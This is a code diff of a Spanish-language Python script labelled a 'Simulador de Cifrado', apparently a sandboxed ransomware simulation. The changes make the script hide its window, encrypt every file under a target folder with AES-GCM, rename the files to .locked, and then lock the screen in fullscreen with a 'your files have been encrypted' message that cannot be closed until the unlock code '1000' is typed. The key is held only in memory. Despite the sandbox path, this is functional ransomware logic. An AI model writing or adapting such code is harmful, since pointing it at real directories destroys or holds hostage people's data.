@@ -1,110 +1,161 @@
 import os
-import random
 import time
 from pathlib import Path
 import threading
 import tkinter as tk
-from tkinter import ttk
+from tkinter import messagebox
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-# CONFIGURACION
-SANDBOX_DIR = Path(r"C:\ransom_sandbox")  # Cambia a tu ruta
-FILES_PER_CYCLE = 10
+# CONFIGURACIÓN
+SANDBOX_DIR = Path(r"C:\ransom_sandbox")  # Ruta de pruebas
 EXT = ".locked"
+WAIT_TIME = 5  # segundos entre carpetas
 
-# Clave de sesión
+# Guardar esta clave para descifrar
 MASTER_KEY = AESGCM.generate_key(bit_length=256)
 aesgcm = AESGCM(MASTER_KEY)
 
-# Listar candidatos
-def list_candidate_files(base_dir):
-    files = []
-    for root, dirs, filenames in os.walk(base_dir):
-        for f in filenames:
-            full = Path(root) / f
-            if not str(full).endswith(EXT):
-                files.append(full)
-    return files
 
-# Encriptar archivo (simulación con progreso)
-def encrypt_file(path: Path, progress_var, file_index):
+def list_folders(base_dir):
+    """Lista todas las carpetas (incluyendo la raíz) que contengan archivos no cifrados."""
+    folders = set()
+    for root, _, filenames in os.walk(base_dir):
+        for f in filenames:
+            if not f.endswith(EXT):
+                folders.add(Path(root))
+    return sorted(folders)
+
+
+def list_files_in_folder(folder):
+    """Lista archivos no cifrados dentro de una carpeta."""
+    return [p for p in folder.iterdir() if p.is_file() and not p.name.endswith(EXT)]
+
+
+def list_encrypted_files(base_dir):
+    """Lista archivos cifrados."""
+    return [
+        Path(root) / f
+        for root, _, filenames in os.walk(base_dir)
+        for f in filenames
+        if f.endswith(EXT)
+    ]
+
+
+def encrypt_file(path: Path):
     try:
-        total_steps = random.randint(20, 50)  # Simulación de tiempo de cifrado
-        for i in range(total_steps + 1):
-            time.sleep(0.05)  # Simula proceso
-            progress_var[file_index] = int((i / total_steps) * 100)
         data = path.read_bytes()
         nonce = os.urandom(12)
         ct = aesgcm.encrypt(nonce, data, None)
-        payload = nonce + ct
-        path.write_bytes(payload)
-        new_name = str(path) + EXT
-        path.rename(new_name)
-        return True
+        path.write_bytes(nonce + ct)
+        path.rename(str(path) + EXT)
     except Exception as e:
         print(f"[ERROR cifrar] {path}: {e}")
-        return False
 
-# Hilo principal de encriptación
+
+def decrypt_file(path: Path):
+    try:
+        payload = path.read_bytes()
+        nonce, ct = payload[:12], payload[12:]
+        data = aesgcm.decrypt(nonce, ct, None)
+        original_path = path.with_suffix("")
+        original_path.write_bytes(data)
+        path.unlink()
+    except Exception as e:
+        print(f"[ERROR descifrar] {path}: {e}")
+
+
+def show_fullscreen_warning():
+    """Pantalla completa bloqueante hasta que se ingrese el código correcto."""
+    for widget in root.winfo_children():
+        widget.destroy()
+
+    root.configure(bg="#111111")
+
+    tk.Label(
+        root,
+        text="¡TUS ARCHIVOS HAN SIDO ENCRIPTADOS!",
+        font=("Arial", 30, "bold"),
+        fg="red",
+        bg="#111111",
+        pady=30
+    ).pack()
+
+    tk.Label(
+        root,
+        text="Introduce el código para restaurar los archivos:",
+        font=("Arial", 16),
+        fg="yellow",
+        bg="#111111"
+    ).pack(pady=20)
+
+    code_entry = tk.Entry(root, font=("Arial", 20), justify="center")
+    code_entry.pack(pady=20)
+
+    def try_decrypt():
+        if code_entry.get() == "1000":
+            decrypted_files = 0
+            for p in list_encrypted_files(SANDBOX_DIR):
+                decrypt_file(p)
+                decrypted_files += 1
+            messagebox.showinfo("Restauración completa",
+                                f"{decrypted_files} archivos restaurados.")
+            root.destroy()
+        else:
+            messagebox.showerror("Error", "Código incorrecto.")
+
+    tk.Button(
+        root,
+        text="Desbloquear",
+        font=("Arial", 18, "bold"),
+        bg="#44aa44",
+        fg="white",
+        relief="flat",
+        padx=30,
+        pady=15,
+        command=try_decrypt
+    ).pack(pady=40)
+
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+
 def start_encryption():
-    files = list_candidate_files(SANDBOX_DIR)
-    total_files = len(files)
-    progress_var = [0] * total_files
-    encrypted_count = [0]
+    """Cifrar por carpetas, esperando 5 segundos entre cada una, mostrando en consola el progreso."""
+    folders = list_folders(SANDBOX_DIR)
 
-    for idx, file in enumerate(files):
-        encrypt_file(file, progress_var, idx)
-        encrypted_count[0] += 1
+    # Total de archivos por cifrar
+    total_files = sum(len(list_files_in_folder(folder)) for folder in folders)
+    encrypted_count = 0
 
-    # Finalizar
-    status_label.config(text="Encriptación completada")
+    for folder in folders:
+        files = list_files_in_folder(folder)
+        for f in files:
+            encrypt_file(f)
+            encrypted_count += 1
+            remaining = total_files - encrypted_count
+            percent_left = (remaining / total_files) * \
+                100 if total_files else 0
+            print(
+                f"Cifrado: {f} | Restantes: {remaining} ({percent_left:.2f}%)")
+        time.sleep(WAIT_TIME)  # Espera antes de pasar a la siguiente carpeta
 
-# Actualizar GUI en tiempo real
-def update_ui():
-    files = list_candidate_files(SANDBOX_DIR)
-    total_files = len(files)
-    # Actualiza lista de archivos
-    listbox.delete(0, tk.END)
-    for idx, file in enumerate(files):
-        perc = progress_values[idx] if idx < len(progress_values) else 0
-        listbox.insert(tk.END, f"{file.name} - {perc}%")
+    # Cuando termine, mostrar la pantalla fullscreen y arrancar mainloop
+    # Usamos root.after para iniciar la interfaz en el hilo principal
+    root.after(0, lambda: (
+        root.deiconify(),                   # <-- Hacer la ventana visible
+        root.attributes("-fullscreen", True),
+        show_fullscreen_warning()
+    ))
 
-    # Porcentaje global
-    if total_files > 0:
-        global_progress = int(sum(progress_values) / (total_files))
-        progress_bar['value'] = global_progress
-        percent_label.config(text=f"{global_progress}%")
-    root.after(100, update_ui)
 
-# Inicializar ventana
+# ----------------- INTERFAZ -----------------
 root = tk.Tk()
 root.title("Simulador de Cifrado")
-root.attributes('-fullscreen', True)
 
-frame = tk.Frame(root)
-frame.pack(expand=True, fill="both", padx=20, pady=20)
+# No poner fullscreen ni interfaz visible aún
+root.withdraw()  # Ocultamos ventana mientras cifra
 
-# Lista de archivos
-listbox = tk.Listbox(frame, font=("Consolas", 14))
-listbox.pack(side="top", fill="both", expand=True)
-
-# Barra de progreso global
-progress_bar = ttk.Progressbar(frame, orient="horizontal", length=400, mode="determinate")
-progress_bar.pack(pady=20)
-
-percent_label = tk.Label(frame, text="0%", font=("Arial", 20, "bold"))
-percent_label.pack()
-
-status_label = tk.Label(frame, text="Iniciando...", font=("Arial", 16))
-status_label.pack(pady=10)
-
-# Variables de progreso
-progress_values = [0] * len(list_candidate_files(SANDBOX_DIR))
-
-# Lanzar en un hilo para no congelar la interfaz
+# Lanzamos cifrado en hilo separado
 threading.Thread(target=start_encryption, daemon=True).start()
 
-# Actualizar interfaz
-update_ui()
-
+# Mostramos ventana principal solo cuando termine cifrado (en start_encryption)
 root.mainloop()
